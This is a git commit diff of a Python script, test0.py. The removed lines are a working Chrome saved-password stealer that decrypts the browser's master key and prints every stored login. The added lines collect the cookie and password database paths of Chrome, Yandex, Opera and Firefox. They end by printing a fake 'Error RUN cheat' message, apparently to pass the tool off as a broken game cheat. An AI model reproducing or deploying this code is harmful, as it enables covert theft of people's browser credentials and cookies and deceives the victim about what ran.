b80e61f49e1b5e2cd02a5f13b1b0820e068f44e9
Iunkin Sergey <iunkin@internet.ru>
2021-11-20 21:50:31 +0300

    some changes

--- test0.py
+++ test0.py
@@ -1,67 +1,32 @@
-import os
-import json
-import base64
-import sqlite3
-import win32crypt
-from Crypto.Cipher import AES
-import shutil
+import os.path
+import getpass
+import random
 
+UserName = '\\' + getpass.getuser()
 
-def get_master_key():
-    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
-        local_state = f.read()
-        local_state = json.loads(local_state)
-    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    master_key = master_key[5:]  # removing DPAPI
-    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-    return master_key
+dir_cookie_google = 'C:\\Users'+UserName+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
+dir_pass_google = "C:\\Users"+UserName+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+dir_cookie_yandex = "C:\\Users"+UserName+"\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies"
+dir_pass_yandex = "C:\\Users"+UserName+"\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Password Checker"
+dir_cookie_opera = "C:\\Users"+UserName+"\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies"
+dir_pass_opera = "C:\\Users"+UserName+"\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"
+dir_google = "C:\\Users"+UserName+"\\AppData\\Local\\Google\\Chrome\\User Data\\Safe Browsing Cookies"
+dir_firefox = "C:\\Users"+UserName+"\\AppData\\Roaming\\Mozilla\\Firefox"
+dir_yandex = "C:\\Users"+UserName+"\\AppData\\Local\\Yandex"
+dir_opera = "C:\\Users"+UserName+"\\AppData\\Roaming\\Opera Software"
 
+if (os.path.exists(dir_google)) == True:
+		filename = "google"+str(random.randint(1, 10000))
+		filename2 = "google_pass" + str(random.randint(1, 10000))
+if (os.path.exists(dir_opera)) == True:
+	filename1 = "opera"+str(random.randint(1, 10000))
+	filename3 = "opera_pass" + str(random.randint(1, 10000))
+if (os.path.exists(dir_yandex)) == True:
+	filename4 = "yandex"+str(random.randint(1, 10000))
+	filename5 = "yandex_pass" + str(random.randint(1, 10000))
 
-def decrypt_payload(cipher, payload):
-    return cipher.decrypt(payload)
-
-
-def generate_cipher(aes_key, iv):
-    return AES.new(aes_key, AES.MODE_GCM, iv)
-
-
-def decrypt_password(buff, master_key):
-    try:
-        iv = buff[3:15]
-        payload = buff[15:]
-        cipher = generate_cipher(master_key, iv)
-        decrypted_pass = decrypt_payload(cipher, payload)
-        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
-        return decrypted_pass
-    except Exception as e:
-        # print("Probably saved password from Chrome version older than v80\n")
-        # print(str(e))
-        return "Chrome < 80"
-
-
-
-if __name__ == '__main__':
-
-    master_key = get_master_key()
-    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
-    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
-    conn = sqlite3.connect("Loginvault.db")
-    cursor = conn.cursor()
-
-    try:
-        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-        for r in cursor.fetchall():
-            url = r[0]
-            username = r[1]
-            encrypted_password = r[2]
-            decrypted_password = decrypt_password(encrypted_password, master_key)
-            print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
-    except Exception as e:
-        pass
-
-    cursor.close()
-    conn.close()
-    try:
-        os.remove("Loginvault.db")
-    except Exception as e:
-        pass
+with open("text.txt", "w") as f:
+   f.write()
+print("Error library import HOUII.dll")
+print("Error RUN cheat")
+input()
